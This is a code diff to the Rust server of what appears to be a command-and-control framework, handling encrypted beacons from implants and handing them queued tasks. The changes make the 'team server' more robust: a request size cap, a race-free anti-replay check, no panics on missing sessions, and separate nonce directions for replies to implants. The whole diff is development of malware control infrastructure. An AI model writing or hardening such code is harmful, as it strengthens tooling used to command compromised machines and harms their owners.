@@ -13,7 +13,7 @@ use std::time::{Instant, SystemTime, UNIX_EPOCH};
 
 use axum::{
     body::Bytes,
-    extract::{ConnectInfo, Query, State},
+    extract::{ConnectInfo, DefaultBodyLimit, Query, State},
     http::{HeaderMap, StatusCode},
     response::{IntoResponse, Response},
     routing::{get, post},
@@ -21,7 +21,8 @@ use axum::{
 };
 use dashmap::DashMap;
 use nyx_protocol::{
-    encode_frame, open_frame, parse_frame, wire::Reader, Command, Response as MsgResponse,
+    encode_frame_dir, open_frame, parse_frame, wire::Reader, Command, Direction,
+    Response as MsgResponse,
     ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
 };
 use serde::{Deserialize, Serialize};
@@ -260,7 +261,12 @@ pub fn router(state: Arc<AppState>) -> Router {
             r.route(&uri, get(beacon))
         };
     }
-    r.with_state(state)
+    // Hard cap on request body size, applied router-wide so it covers BOTH the
+    // axum::serve path (which has its own 2 MiB default for extractors) AND the
+    // raw-TLS `serve_connection` path in main.rs (which has NO default limit).
+    // 512 KiB is generously above any real beacon frame (ct cap is 256 KiB) but
+    // blocks the multi-GB-buffering OOM vector.
+    r.layer(DefaultBodyLimit::max(512 * 1024)).with_state(state)
 }
 
 // ---- implant endpoint ------------------------------------------------------
@@ -391,17 +397,23 @@ fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> any
         }
     }
     let raw = parse_frame(body)?;
-    let is_new = !st.sessions.contains_key(&raw.pubkey);
 
-    let key = if is_new {
-        st.keypair.derive_for(&raw.pubkey)
-    } else {
-        let s = st.sessions.get(&raw.pubkey).expect("checked above");
-        // Anti-replay: reject non-monotonic counters.
-        if raw.counter <= s.last_recv {
-            anyhow::bail!("replayed/stale counter {}", raw.counter);
+    // Decide new-vs-existing and (for existing) run the anti-replay check +
+    // derive the key, all without holding a `.expect()`-prone TOCTOU window.
+    // The server runs under `panic = "abort"`, so any panic here kills the whole
+    // team server — we must never panic on a missing/raced session entry.
+    let (is_new, key) = match st.sessions.get(&raw.pubkey) {
+        None => (true, st.keypair.derive_for(&raw.pubkey)),
+        Some(s) => {
+            // Anti-replay: reject non-monotonic counters. (The actual last_recv
+            // update happens below under a single get_mut guard so the check
+            // and the write can't be split by a concurrent beacon for the same
+            // session.)
+            if raw.counter <= s.last_recv {
+                anyhow::bail!("replayed/stale counter {}", raw.counter);
+            }
+            (false, s.key)
         }
-        s.key
     };
 
     let plaintext = open_frame(&key, &raw).map_err(|_| anyhow::anyhow!("frame decryption failed"))?;
@@ -442,7 +454,15 @@ fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> any
         st.sessions.insert(raw.pubkey, session);
         st.events.fire(&new_event);
         // No tasks queued yet — reply with an empty batch.
-        Ok(encode_frame(&raw.pubkey, 0, &key, &Task::encode_vec(&[])))
+        // Reply sealed in the server→implant nonce space (Direction::ServerToClient)
+        // so it never collides with the implant's own Tx nonces under the shared key.
+        Ok(encode_frame_dir(
+            &raw.pubkey,
+            Direction::ServerToClient,
+            0,
+            &key,
+            &Task::encode_vec(&[]),
+        ))
     } else {
         // Subsequent messages carry task responses; we reply with queued tasks.
         let responses = TaskResponse::decode_vec(&plaintext)?;
@@ -460,20 +480,31 @@ fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> any
                 },
             ));
         }
-        {
-            let mut s = st.sessions.get_mut(&raw.pubkey).expect("checked above");
-            s.last_recv = raw.counter;
-            for r in responses {
-                s.results.push(r);
-            }
+        // Hold a single write guard for the anti-replay commit + result ingest
+        // + task drain, so a concurrent beacon for the same session can't split
+        // the check from the write (TOCTOU) or race the pending-tasks drain.
+        // If the session vanished between the get() above and here (e.g. an
+        // operator eviction added later), return a clean error — never panic.
+        let mut s = st
+            .sessions
+            .get_mut(&raw.pubkey)
+            .ok_or_else(|| anyhow::anyhow!("session vanished mid-request"))?;
+        s.last_recv = raw.counter;
+        for r in responses {
+            s.results.push(r);
         }
-        let (reply, counter) = {
-            let mut s = st.sessions.get_mut(&raw.pubkey).expect("checked above");
-            let tasks = std::mem::take(&mut s.pending);
-            s.send_counter += 1;
-            (Task::encode_vec(&tasks), s.send_counter)
-        };
-        Ok(encode_frame(&raw.pubkey, counter, &key, &reply))
+        let tasks = std::mem::take(&mut s.pending);
+        s.send_counter += 1;
+        let counter = s.send_counter;
+        drop(s);
+        let reply = Task::encode_vec(&tasks);
+        Ok(encode_frame_dir(
+            &raw.pubkey,
+            Direction::ServerToClient,
+            counter,
+            &key,
+            &reply,
+        ))
     }
 }
 
